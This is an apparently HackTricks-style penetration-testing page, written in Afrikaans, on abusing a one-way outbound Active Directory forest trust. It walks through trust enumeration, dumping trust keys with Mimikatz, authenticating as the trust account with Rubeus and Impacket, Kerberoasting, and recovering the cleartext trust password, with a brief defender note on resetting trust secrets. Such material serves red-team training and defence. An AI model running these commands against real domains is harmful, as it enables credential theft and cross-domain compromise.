# External Forest Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

In hierdie scenario **jou domain** **vertrou** sekere **privileges** aan principals van 'n **ander domain/forest**.

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
As jy die AD module beskikbaar het, inspekteer die **Trusted Domain Object (TDO)** ook direk. Dit gee jou die rou LDAP-ondersteunde trust data wat jy later sal nodig hê wanneer jy besluit of die maklike pad **FSP/group abuse** of **trust-account abuse** is:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Jy behoort ook te lys waar die foreign principals van `CN=ForeignSecurityPrincipals` eintlik toegang toegestaan is. Algemene oorwinnings is:

- **Local admin** op 'n server/DC in jou huidige domain
- Membership in 'n **custom domain group** wat ACLs oor users/computers/GPOs het
- Rights om **computer objects** te wysig, wat later [RBCD](resource-based-constrained-delegation.md) kan word as die trust configuration dit toelaat

## Trust Account Attack

Wanneer 'n eenrigting-trust geskep word van domain/forest **B** na domain/forest **A** (**B trusts A**), word 'n **trust account** vir **B** in **A** geskep. In die outbound-trust view van **A** is dit nuttig omdat as jy later **B** kompromitteer (die trusting side), jy die trust secret daar kan dump en terug na **A** kan authenticate as `B$`.

Die kritieke aspek om hier te verstaan is dat die password en Kerberos material vir daardie trust account onttrek kan word vanaf 'n Domain Controller in die **trusting** domain met behulp van:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Dit werk omdat die trust account wat in die **trusted** domain geskep is, ’n geaktiveerde principal is wat uiteindelik die basiese regte van ’n gewone domain user daar kry. Dit is dikwels genoeg om LDAP te begin enumereer, tickets aan te vra, en die volgende escalation path te vind.

In ’n scenario waar `ext.local` die **trusting** domain is en `root.local` die **trusted** domain, word ’n user account genaamd `EXT$` binne `root.local` geskep. Om die trust keys uit `ext.local` te dump, onthul credentials wat as `root.local\EXT$` teen `root.local` gebruik kan word:
```bash
lsadump::trust /patch
```
Volg hierna die onttrekte **RC4**-sleutel om as `root.local\EXT$` binne `root.local` te verifieer:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Noem dan die trusted domain as daardie principal, byvoorbeeld deur 'n hoë-waarde SPN in `root.local` te Kerberoast:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Van Linux

As jy die **RC4** trust-account-sleutel herstel het, werk dieselfde idee vanaf Linux met Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
As **RC4** nie aanvaar word nie, val terug op die herstelde **cleartext password** (of afgeleide **AES** keys) en hergebruik die gewone [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) en [Kerberoast](kerberoast.md) werkvloeie vanaf daardie foothold.

### Key material gotchas

Moenie **trust keys** en **trust-account credentials** deurmekaar maak nie:

- In ’n one-way trust stoor albei kante ’n **TDO**, maar die werklike **`EXT$` user account** bestaan net in die trusted domain.
- Die huidige trust-account password word weerspieël in die TDO trust secret (`NewPassword` / current trust key).
- Die **RC4** trust key is die maklikste artifact om vir `asktgt` as die trust account te hergebruik; in verstek-opstellings is dit gewoonlik die werkende enctype omdat die trust account dikwels ’n leë `msDS-SupportedEncryptionTypes` het.
- As jy in terme van **AES trust keys** dink, onthou hulle is nie uitruilbaar met die trust-account AES keys nie omdat die salts verskil.

Dus, vir die technique op hierdie page, verkies óf die gedumpte **RC4** material óf die herstelde **cleartext** password.

### Gathering cleartext trust password

In die vorige flow is die trust hash gebruik in plaas van die **cleartext password** (dit word ook deur **mimikatz** gedump).

Die cleartext password kan verkry word deur die \[ CLEAR ] output van mimikatz van hexadecimal om te skakel en null bytes `\x00` te verwyder:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)

Soms, wanneer ’n trust relationship geskep word, moet ’n password deur die user vir die trust ingetik word. In hierdie demonstration is die key die oorspronklike trust password en dus mensleesbaar. Soos die key roteer (verstek: elke 30 days), sal die cleartext gewoonlik ophou om mensleesbaar te wees, maar is dit nog tegnies bruikbaar.

Die cleartext password kan gebruik word om gewone authentication as die trust account uit te voer, as ’n alternatief om ’n TGT met die Kerberos secret key van die trust account aan te vra. Hier, die navraag van `root.local` vanaf `ext.local` vir members van `Domain Admins`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Trust accounts is ongemaklike principals. Interactive logons soos **RUNAS / console / RDP** is nie die verwagte pad hier nie, en **NTLM** authentication pogings kan misluk met `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Beplan eerder vir **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast).

### Persistence / cleanup note

As defenders besef die trusting domain is gekompromitteer, moet hulle die trust secret aan **beide kante** roteer met `netdom trust ... /resetOneSide ...`. Vanuit ’n operator-perspektief is dit belangrik omdat ’n **manual reset die ou trust material onmiddellik ongeldig maak**, terwyl normale trust-password rotation huidige/vorige values tydens rollover behou.
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Verwysings

- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
